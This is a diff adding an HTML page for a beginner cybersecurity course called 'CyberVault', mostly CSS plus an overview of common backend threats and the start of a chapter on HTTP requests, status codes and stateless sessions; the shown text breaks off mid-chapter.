@@ -1,0 +1,2391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>CyberVault -- Backend Security Mastery</title>
+  <meta name="description" content="A complete cybersecurity learning guide for backend systems. Beginner-friendly, dual-track: coding foundations plus security concepts.">
+  <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,300;1,400&family=Outfit:wght@400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:       #0b0918;
+      --bg2:      #12102a;
+      --page-bg:  #13102b;
+      --purple:   #7c4dff;
+      --purple2:  #4a2fa0;
+      --cyan:     #00e5ff;
+      --green:    #00e676;
+      --red:      #ff1744;
+      --yellow:   #ffd740;
+      --text:     #e8e0ff;
+      --text2:    #a89cc8;
+      --border:   rgba(124, 77, 255, 0.2);
+      --glass:    rgba(124, 77, 255, 0.06);
+      --page-shadow: 0 4px 40px rgba(0,0,0,0.6);
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; font-size: 16px; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Outfit', sans-serif;
+      min-height: 100vh;
+      display: flex;
+    }
+
+    /* ========== SIDEBAR ========== */
+    .sidebar {
+      position: fixed;
+      left: 0; top: 0;
+      width: 270px;
+      height: 100vh;
+      background: rgba(18, 16, 42, 0.97);
+      border-right: 1px solid var(--border);
+      overflow-y: auto;
+      z-index: 200;
+      display: flex;
+      flex-direction: column;
+      transition: transform 0.3s ease;
+    }
+    .sidebar::-webkit-scrollbar { width: 4px; }
+    .sidebar::-webkit-scrollbar-thumb { background: var(--purple2); border-radius: 2px; }
+
+    .sidebar-header {
+      padding: 28px 24px 16px;
+      border-bottom: 1px solid var(--border);
+    }
+    .sidebar-logo {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 900;
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    .sidebar-sub {
+      font-size: 0.72rem;
+      color: var(--text2);
+      margin-top: 4px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .sidebar nav { padding: 12px 0 24px; flex: 1; }
+    .nav-label {
+      font-size: 0.62rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: rgba(255,255,255,0.25);
+      padding: 14px 24px 6px;
+    }
+    .sidebar nav a {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 24px;
+      color: var(--text2);
+      text-decoration: none;
+      font-size: 0.88rem;
+      border-left: 3px solid transparent;
+      transition: all 0.18s ease;
+      line-height: 1.4;
+    }
+    .sidebar nav a .ch-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      color: var(--purple);
+      min-width: 24px;
+    }
+    .sidebar nav a:hover { color: var(--cyan); border-left-color: var(--cyan); background: rgba(0,229,255,0.04); }
+    .sidebar nav a.active { color: var(--cyan); border-left-color: var(--cyan); background: rgba(0,229,255,0.06); font-weight: 600; }
+
+    /* ========== MAIN / BOOK ========== */
+    .book-wrap {
+      margin-left: 270px;
+      flex: 1;
+      padding: 40px 40px 80px;
+      min-height: 100vh;
+    }
+
+    /* ========== PAGE ========== */
+    .page {
+      max-width: 820px;
+      margin: 0 auto 64px;
+      background: var(--page-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      box-shadow: var(--page-shadow);
+      overflow: hidden;
+    }
+
+    .page-header {
+      background: linear-gradient(135deg, rgba(124,77,255,0.18), rgba(0,229,255,0.06));
+      border-bottom: 1px solid var(--border);
+      padding: 36px 48px 28px;
+    }
+    .page-eyebrow {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      color: var(--purple);
+      margin-bottom: 10px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .page-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 2rem;
+      font-weight: 900;
+      color: var(--text);
+      line-height: 1.2;
+      margin-bottom: 8px;
+    }
+    .page-title span {
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .page-subtitle {
+      font-size: 1rem;
+      color: var(--text2);
+      line-height: 1.5;
+    }
+
+    .page-body { padding: 40px 48px; }
+
+    .page-footer {
+      background: rgba(0,0,0,0.25);
+      border-top: 1px solid var(--border);
+      padding: 14px 48px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .page-number {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      color: var(--text2);
+    }
+    .page-nav { display: flex; gap: 12px; }
+    .page-nav a {
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: var(--cyan);
+      text-decoration: none;
+      padding: 6px 16px;
+      border: 1px solid rgba(0,229,255,0.25);
+      border-radius: 8px;
+      transition: all 0.18s;
+    }
+    .page-nav a:hover { background: rgba(0,229,255,0.08); }
+
+    /* ========== CONTENT BLOCKS ========== */
+    h2.section-title {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--cyan);
+      margin: 32px 0 12px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+    h2.section-title:first-child { margin-top: 0; }
+
+    h3.sub-title {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: var(--purple);
+      margin: 24px 0 10px;
+    }
+    h3.sub-title:first-child { margin-top: 0; }
+
+    p {
+      color: var(--text);
+      line-height: 1.75;
+      font-size: 0.95rem;
+      margin-bottom: 14px;
+      opacity: 0.88;
+    }
+
+    /* CODE PREP BOX */
+    .code-prep {
+      background: rgba(0, 230, 118, 0.05);
+      border: 1px solid rgba(0,230,118,0.25);
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin: 20px 0 28px;
+    }
+    .code-prep-label {
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--green);
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 6px;
+    }
+    .code-prep-title {
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--green);
+      margin-bottom: 10px;
+    }
+    .code-prep ul { list-style: none; padding: 0; }
+    .code-prep li {
+      font-size: 0.88rem;
+      color: var(--text);
+      padding: 3px 0;
+      opacity: 0.85;
+    }
+    .code-prep li::before { content: ">> "; color: var(--green); font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; }
+    .code-prep .why {
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(0,230,118,0.15);
+      font-size: 0.85rem;
+      color: var(--text2);
+      line-height: 1.6;
+      font-style: italic;
+    }
+
+    /* ANALOGY BOX */
+    .analogy {
+      background: rgba(0, 229, 255, 0.05);
+      border-left: 4px solid var(--cyan);
+      border-radius: 0 10px 10px 0;
+      padding: 16px 20px;
+      margin: 16px 0;
+    }
+    .analogy-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--cyan);
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 6px;
+    }
+    .analogy p {
+      font-style: italic;
+      color: var(--text);
+      font-size: 0.92rem;
+      margin: 0;
+    }
+
+    /* WARNING BOX */
+    .warning-box {
+      background: rgba(255, 23, 68, 0.06);
+      border-left: 4px solid var(--red);
+      border-radius: 0 10px 10px 0;
+      padding: 16px 20px;
+      margin: 16px 0;
+    }
+    .warning-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--red);
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 6px;
+    }
+    .warning-box p { color: var(--text); font-size: 0.9rem; margin: 0; }
+
+    /* TIP BOX */
+    .tip-box {
+      background: rgba(255,215,64,0.05);
+      border-left: 4px solid var(--yellow);
+      border-radius: 0 10px 10px 0;
+      padding: 16px 20px;
+      margin: 16px 0;
+    }
+    .tip-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--yellow);
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 6px;
+    }
+    .tip-box p { color: var(--text); font-size: 0.9rem; margin: 0; }
+
+    /* CODE COMPARE */
+    .code-compare {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin: 20px 0;
+    }
+    .code-block {
+      border-radius: 10px;
+      padding: 18px;
+      overflow-x: auto;
+    }
+    .code-block.bad {
+      background: rgba(255,23,68,0.07);
+      border: 1px solid rgba(255,23,68,0.25);
+    }
+    .code-block.good {
+      background: rgba(0,230,118,0.07);
+      border: 1px solid rgba(0,230,118,0.25);
+    }
+    .code-block-label {
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    .code-block.bad .code-block-label { color: var(--red); }
+    .code-block.good .code-block-label { color: var(--green); }
+    .code-block pre {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      line-height: 1.6;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .code-block.bad pre { color: #ff8a9b; }
+    .code-block.good pre { color: #69ffb4; }
+    .code-note {
+      font-size: 0.78rem;
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(255,255,255,0.08);
+      line-height: 1.5;
+      opacity: 0.75;
+    }
+    .code-block.bad .code-note { color: var(--red); }
+    .code-block.good .code-note { color: var(--green); }
+
+    /* SINGLE CODE BLOCK */
+    .code-single {
+      background: rgba(0,0,0,0.4);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px 20px;
+      margin: 16px 0;
+      overflow-x: auto;
+    }
+    .code-single pre {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: #c5b8ff;
+      line-height: 1.65;
+      white-space: pre-wrap;
+    }
+
+    /* FLOW DIAGRAM */
+    .flow {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 20px 0;
+      text-align: center;
+    }
+    .flow-label-top {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--text2);
+      margin-bottom: 16px;
+    }
+    .flow-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 0;
+      margin: 8px 0;
+    }
+    .flow-node {
+      border: 1px solid rgba(124,77,255,0.4);
+      background: rgba(124,77,255,0.08);
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-size: 0.82rem;
+      color: var(--text);
+      min-width: 110px;
+      text-align: center;
+    }
+    .flow-node.red { border-color: var(--red); background: rgba(255,23,68,0.07); color: var(--red); }
+    .flow-node.green { border-color: var(--green); background: rgba(0,230,118,0.07); color: var(--green); }
+    .flow-node.cyan { border-color: var(--cyan); background: rgba(0,229,255,0.07); color: var(--cyan); }
+    .flow-node.yellow { border-color: var(--yellow); background: rgba(255,215,64,0.07); color: var(--yellow); }
+    .flow-arrow {
+      font-size: 1.2rem;
+      color: rgba(124,77,255,0.5);
+      margin: 0 6px;
+    }
+    .flow-down { font-size: 1.5rem; color: rgba(124,77,255,0.4); margin: 6px 0; }
+    .flow-divider {
+      height: 1px;
+      background: var(--border);
+      margin: 16px 0;
+    }
+
+    /* TABLE */
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.86rem;
+      margin: 16px 0;
+    }
+    .data-table th {
+      background: rgba(124,77,255,0.12);
+      color: var(--cyan);
+      text-align: left;
+      padding: 10px 14px;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border-bottom: 1px solid var(--border);
+    }
+    .data-table td {
+      padding: 10px 14px;
+      color: var(--text);
+      opacity: 0.85;
+      border-bottom: 1px solid rgba(124,77,255,0.08);
+      vertical-align: top;
+      line-height: 1.5;
+    }
+    .data-table tr:hover td { background: rgba(124,77,255,0.04); }
+    .data-table td strong { color: var(--purple); }
+    .tag {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.72rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+    }
+    .tag.python { background: rgba(124,77,255,0.15); color: var(--purple); border: 1px solid rgba(124,77,255,0.3); }
+    .tag.js { background: rgba(255,215,64,0.1); color: var(--yellow); border: 1px solid rgba(255,215,64,0.25); }
+
+    /* NUMBERED LIST */
+    .num-list { list-style: none; padding: 0; counter-reset: num; }
+    .num-list li {
+      counter-increment: num;
+      position: relative;
+      padding: 8px 0 8px 44px;
+      border-left: 2px solid rgba(124,77,255,0.2);
+      margin-left: 14px;
+      font-size: 0.9rem;
+      color: var(--text);
+      line-height: 1.6;
+      opacity: 0.85;
+    }
+    .num-list li::before {
+      content: counter(num);
+      position: absolute;
+      left: -14px;
+      top: 8px;
+      width: 24px;
+      height: 24px;
+      background: var(--purple2);
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.72rem;
+      font-weight: 700;
+    }
+
+    /* BULLET LIST */
+    .bullet-list { list-style: none; padding: 0; }
+    .bullet-list li {
+      padding: 5px 0 5px 20px;
+      position: relative;
+      font-size: 0.9rem;
+      color: var(--text);
+      line-height: 1.6;
+      opacity: 0.85;
+    }
+    .bullet-list li::before { content: "--"; position: absolute; left: 0; color: var(--purple); font-family: 'JetBrains Mono', monospace; }
+
+    /* DIVIDER */
+    .divider { height: 1px; background: var(--border); margin: 28px 0; }
+
+    /* SIMULATOR */
+    .simulator {
+      background: rgba(0,0,0,0.35);
+      border: 1px solid rgba(124,77,255,0.3);
+      border-radius: 12px;
+      padding: 22px;
+      margin: 20px 0;
+    }
+    .sim-label {
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: #ff5580;
+      font-family: 'JetBrains Mono', monospace;
+      margin-bottom: 8px;
+    }
+    .sim-title { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 14px; }
+    .sim-input {
+      width: 100%;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(124,77,255,0.3);
+      border-radius: 7px;
+      padding: 10px 14px;
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.88rem;
+    }
+    .sim-input:focus { outline: none; border-color: var(--cyan); }
+    .sim-btn {
+      margin-top: 10px;
+      padding: 10px 22px;
+      background: linear-gradient(135deg, var(--purple2), var(--purple));
+      border: none;
+      border-radius: 7px;
+      color: white;
+      font-weight: 700;
+      font-size: 0.88rem;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    .sim-btn:hover { opacity: 0.82; }
+    .sim-btn.danger-btn { background: linear-gradient(135deg, #aa0022, var(--red)); }
+    .sim-output {
+      margin-top: 14px;
+      background: rgba(0,0,0,0.5);
+      border-radius: 7px;
+      padding: 14px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: var(--green);
+      line-height: 1.7;
+      min-height: 50px;
+      white-space: pre-wrap;
+    }
+    .sim-output.danger { color: var(--red); }
+
+    /* OVERVIEW GRID */
+    .threat-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+      gap: 12px;
+      margin: 16px 0;
+    }
+    .threat-card {
+      border: 1px solid var(--border);
+      background: var(--glass);
+      border-radius: 10px;
+      padding: 18px 14px;
+      text-align: center;
+      transition: border-color 0.2s, transform 0.2s;
+      cursor: default;
+    }
+    .threat-card:hover { border-color: var(--cyan); transform: translateY(-3px); }
+    .threat-icon { font-size: 1.4rem; margin-bottom: 8px; }
+    .threat-name { font-size: 0.85rem; font-weight: 700; color: var(--cyan); margin-bottom: 4px; }
+    .threat-desc { font-size: 0.75rem; color: var(--text2); line-height: 1.4; }
+
+    /* ROADMAP TABLE */
+    .roadmap-table { width: 100%; border-collapse: collapse; font-size: 0.84rem; margin: 14px 0; }
+    .roadmap-table th { background: rgba(124,77,255,0.12); color: var(--cyan); text-align: left; padding: 9px 12px; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid var(--border); }
+    .roadmap-table td { padding: 9px 12px; color: var(--text); opacity: 0.85; border-bottom: 1px solid rgba(124,77,255,0.07); vertical-align: middle; }
+    .roadmap-table tr:hover td { background: rgba(124,77,255,0.04); }
+    .ch-badge { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--purple); font-weight: 700; }
+
+    /* MOBILE / TABLET */
+    .menu-toggle {
+      display: none;
+      position: fixed;
+      top: 16px;
+      left: 16px;
+      z-index: 300;
+      background: var(--purple2);
+      border: none;
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .sidebar-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      z-index: 150;
+    }
+
+    @media (max-width: 1024px) {
+      .sidebar { transform: translateX(-100%); }
+      .sidebar.open { transform: translateX(0); }
+      .sidebar-overlay.open { display: block; }
+      .menu-toggle { display: block; }
+      .book-wrap { margin-left: 0; padding: 70px 20px 80px; }
+      .page-header { padding: 28px 28px 20px; }
+      .page-body { padding: 28px 28px; }
+      .page-footer { padding: 14px 28px; }
+      .code-compare { grid-template-columns: 1fr; }
+      .page-title { font-size: 1.5rem; }
+    }
+    @media (max-width: 640px) {
+      .book-wrap { padding: 64px 12px 60px; }
+      .page-header { padding: 22px 20px 16px; }
+      .page-body { padding: 20px 20px; }
+      .page-footer { padding: 12px 20px; flex-direction: column; gap: 10px; text-align: center; }
+      .page-title { font-size: 1.3rem; }
+      .threat-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+  </style>
+</head>
+<body>
+
+<button class="menu-toggle" onclick="toggleSidebar()">&#9776; Menu</button>
+<div class="sidebar-overlay" id="overlay" onclick="toggleSidebar()"></div>
+
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-logo">CyberVault</div>
+    <div class="sidebar-sub">Backend Security Mastery</div>
+  </div>
+  <nav>
+    <div class="nav-label">Overview</div>
+    <a href="#overview" class="active"><span class="ch-num">00</span> Overview &amp; Roadmap</a>
+    <div class="nav-label">Chapters</div>
+    <a href="#ch1"><span class="ch-num">01</span> Web Foundations</a>
+    <a href="#ch2"><span class="ch-num">02</span> Authentication</a>
+    <a href="#ch3"><span class="ch-num">03</span> Authorization</a>
+    <a href="#ch4"><span class="ch-num">04</span> Injection Attacks</a>
+    <a href="#ch5"><span class="ch-num">05</span> Encryption</a>
+    <a href="#ch6"><span class="ch-num">06</span> API Defense</a>
+    <a href="#ch7"><span class="ch-num">07</span> Session Exploits</a>
+    <a href="#ch8"><span class="ch-num">08</span> Infrastructure</a>
+    <a href="#ch9"><span class="ch-num">09</span> Logging &amp; Secrets</a>
+    <a href="#ch10"><span class="ch-num">10</span> Security Lifecycle</a>
+  </nav>
+</aside>
+
+<div class="book-wrap">
+
+  <!-- ===================== PAGE 0: OVERVIEW ===================== -->
+  <div class="page" id="overview">
+    <div class="page-header">
+      <div class="page-eyebrow">CyberVault -- Page 0 of 10</div>
+      <div class="page-title"><span>Backend Security</span> -- The Big Picture</div>
+      <div class="page-subtitle">Start here. This overview shows you the full map before you dive in.</div>
+    </div>
+    <div class="page-body">
+
+      <h2 class="section-title">What Is This Guide?</h2>
+      <p>This is a complete, beginner-friendly guide to cybersecurity in backend systems. It is written for someone who is just starting to learn to code. Each chapter begins with a <strong style="color:var(--green)">Coding Prep Mission</strong> -- a specific programming topic you should learn first, before reading the security content. Once you have learned that topic, everything in the chapter will make sense.</p>
+      <p>You do not need to know anything about hacking or security before starting. This guide builds your knowledge one layer at a time, from the absolute basics to advanced security concepts.</p>
+
+      <h2 class="section-title">The 8 Threats You Will Understand</h2>
+      <div class="threat-grid">
+        <div class="threat-card">
+          <div class="threat-icon">[SQL]</div>
+          <div class="threat-name">SQL Injection</div>
+          <div class="threat-desc">Poisoning database queries with malicious input</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[AUTH]</div>
+          <div class="threat-name">Broken Auth</div>
+          <div class="threat-desc">Fake identities and stolen login sessions</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[KEY]</div>
+          <div class="threat-name">IDOR / BOLA</div>
+          <div class="threat-desc">Accessing other users' private data</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[XSS]</div>
+          <div class="threat-name">XSS</div>
+          <div class="threat-desc">Injecting malicious scripts into browsers</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[DDoS]</div>
+          <div class="threat-name">DDoS</div>
+          <div class="threat-desc">Flooding servers with fake traffic until they crash</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[CSRF]</div>
+          <div class="threat-name">CSRF</div>
+          <div class="threat-desc">Forging requests as if they came from you</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[LEAK]</div>
+          <div class="threat-name">Insecure Storage</div>
+          <div class="threat-desc">Passwords and secrets saved in plain text</div>
+        </div>
+        <div class="threat-card">
+          <div class="threat-icon">[PKG]</div>
+          <div class="threat-name">Supply Chain</div>
+          <div class="threat-desc">Vulnerabilities hidden inside third-party packages</div>
+        </div>
+      </div>
+
+      <h2 class="section-title">How a Backend Gets Attacked -- A Simple Flow</h2>
+      <div class="flow">
+        <div class="flow-label-top">DEFENDED PATH -- The attacker fails</div>
+        <div class="flow-row">
+          <div class="flow-node red">Attacker</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node yellow">Internet</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node green">Firewall / WAF</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Backend Server</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Database</div>
+        </div>
+        <div class="flow-divider"></div>
+        <div class="flow-label-top">BREACHED PATH -- No defenses in place</div>
+        <div class="flow-row">
+          <div class="flow-node red">Attacker</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">No Firewall</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Vulnerable Server</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Database BREACHED</div>
+        </div>
+      </div>
+
+      <h2 class="section-title">Your 10-Chapter Learning Roadmap</h2>
+      <table class="roadmap-table">
+        <thead>
+          <tr><th>Chapter</th><th>Security Topic</th><th>Coding Concept to Learn First</th><th>Language</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><span class="ch-badge">01</span></td><td>Web Foundations &amp; HTTP</td><td>Variables &amp; Data Types</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">02</span></td><td>Authentication &amp; Passwords</td><td>Strings &amp; String Manipulation</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">03</span></td><td>Authorization &amp; Sessions</td><td>JSON &amp; Dictionaries / Objects</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">04</span></td><td>Injection Attacks</td><td>Conditionals (if / else)</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">05</span></td><td>Encryption &amp; Data Protection</td><td>Functions &amp; Parameters</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">06</span></td><td>API Defense &amp; Validation</td><td>Lists, Loops &amp; Iteration</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">07</span></td><td>Session Exploits &amp; CSRF</td><td>Dictionaries &amp; Cookies Concept</td><td><span class="tag js">JavaScript</span></td></tr>
+          <tr><td><span class="ch-badge">08</span></td><td>Infrastructure &amp; Headers</td><td>Environment Variables &amp; Config</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">09</span></td><td>Logging &amp; Secrets</td><td>File Reading &amp; Writing (I/O)</td><td><span class="tag python">Python</span></td></tr>
+          <tr><td><span class="ch-badge">10</span></td><td>Security Lifecycle</td><td>Git, Version Control &amp; Packages</td><td><span class="tag js">JavaScript</span></td></tr>
+        </tbody>
+      </table>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 0 &nbsp;|&nbsp; CyberVault -- Backend Security Mastery</div>
+      <div class="page-nav"><a href="#ch1">Next: Chapter 01 --&gt;</a></div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 1: WEB FOUNDATIONS ===================== -->
+  <div class="page" id="ch1">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 01 -- Page 1 of 10</div>
+      <div class="page-title">Web Foundations <span>&amp; HTTP</span></div>
+      <div class="page-subtitle">Understanding how the internet talks -- before we learn to secure it.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 1 to 2</div>
+        <div class="code-prep-title">Learn: Variables &amp; Data Types in Python</div>
+        <ul>
+          <li>What a variable is and how to create one</li>
+          <li>The three main types: string (text), integer (number), boolean (true/false)</li>
+          <li>How to print values to the screen using print()</li>
+          <li>Basic arithmetic with numbers</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Every web request is just data -- a username, a password, a URL. These are all strings and numbers. Before you can understand how to secure data, you need to understand what data is in code.</div>
+      </div>
+
+      <h2 class="section-title">1.1 -- Client &amp; Server: The Restaurant Analogy</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy</div>
+        <p>Think of a restaurant. YOU are the customer (the browser / client). The WAITER is the internet connection (HTTP protocol). The KITCHEN is the server. The MENU is the API -- the list of things the server can do for you. You order from the menu. The kitchen prepares it. The waiter brings it back. That is exactly how the web works.</p>
+      </div>
+      <p>When you visit a website, your browser (the client) sends a request to a server. The server processes it and sends back a response. This is called the client-server model.</p>
+      <ul class="bullet-list">
+        <li><strong>Client</strong> -- the browser, app, or any program making a request</li>
+        <li><strong>Server</strong> -- a computer that listens for requests and sends back responses</li>
+        <li><strong>HTTP</strong> -- the language they use to communicate (HyperText Transfer Protocol)</li>
+        <li><strong>API</strong> -- the set of rules defining what requests the server accepts</li>
+      </ul>
+
+      <div class="flow">
+        <div class="flow-label-top">HOW A WEB REQUEST WORKS</div>
+        <div class="flow-row">
+          <div class="flow-node cyan">Browser (Client)</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node">HTTP Request</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Server</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node">Process Logic</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node green">HTTP Response</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Browser</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">1.2 -- Anatomy of an HTTP Request</h2>
+      <p>Every time you click a link or submit a form, your browser sends an HTTP request. Here is what that request looks like in raw form:</p>
+      <div class="code-single">
+<pre>GET /api/users/42 HTTP/1.1
+Host: example.com
+Authorization: Bearer eyJhbGci...
+Content-Type: application/json
+Accept: application/json</pre>
+      </div>
+      <p>Breaking that down:</p>
+      <ul class="bullet-list">
+        <li><strong>GET</strong> -- the METHOD. Tells the server what to do. GET = fetch data. POST = send new data. PUT = update data. DELETE = remove data.</li>
+        <li><strong>/api/users/42</strong> -- the PATH. This is the specific resource you want.</li>
+        <li><strong>Host</strong> -- the domain name of the server.</li>
+        <li><strong>Authorization</strong> -- a token proving you are logged in.</li>
+        <li><strong>Content-Type</strong> -- the format of any data you are sending.</li>
+      </ul>
+
+      <h3 class="sub-title">HTTP Status Codes</h3>
+      <p>The server replies with a status code telling you what happened:</p>
+      <table class="data-table">
+        <thead><tr><th>Code</th><th>Meaning</th><th>In English</th></tr></thead>
+        <tbody>
+          <tr><td><strong style="color:var(--green)">200</strong></td><td>OK</td><td>Everything worked. Here is your data.</td></tr>
+          <tr><td><strong style="color:var(--green)">201</strong></td><td>Created</td><td>Something was successfully created.</td></tr>
+          <tr><td><strong style="color:var(--yellow)">400</strong></td><td>Bad Request</td><td>You sent something the server did not understand.</td></tr>
+          <tr><td><strong style="color:var(--red)">401</strong></td><td>Unauthorized</td><td>You are not logged in. Prove who you are first.</td></tr>
+          <tr><td><strong style="color:var(--red)">403</strong></td><td>Forbidden</td><td>You are logged in but not allowed to do this.</td></tr>
+          <tr><td><strong style="color:var(--red)">404</strong></td><td>Not Found</td><td>The resource you asked for does not exist.</td></tr>
+          <tr><td><strong style="color:var(--red)">500</strong></td><td>Server Error</td><td>Something crashed on the server side.</td></tr>
+        </tbody>
+      </table>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">1.3 -- The Stateless Web: Why Servers Forget You</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Amnesiac Waiter</div>
+        <p>Imagine a waiter who loses their memory after every single interaction. You order a coffee. They bring it. You ask for milk. They have no memory of who you are. You have to re-introduce yourself every single time. HTTP works exactly this way. The server has no memory of your previous requests. Every request starts completely fresh.</p>
+      </div>
+      <p>This design is called <strong>stateless</strong>. The server does not store information about what happened in previous requests. This is intentional -- it makes servers simpler and faster. But it creates a problem: how does the server know who you are after you log in?</p>
+      <p>The solution is <strong>session management</strong>: after you log in, the server gives you a ticket (a session cookie or a JWT token) that you attach to every future request. The server reads the ticket to identify you.</p>
+
+      <div class="flow">
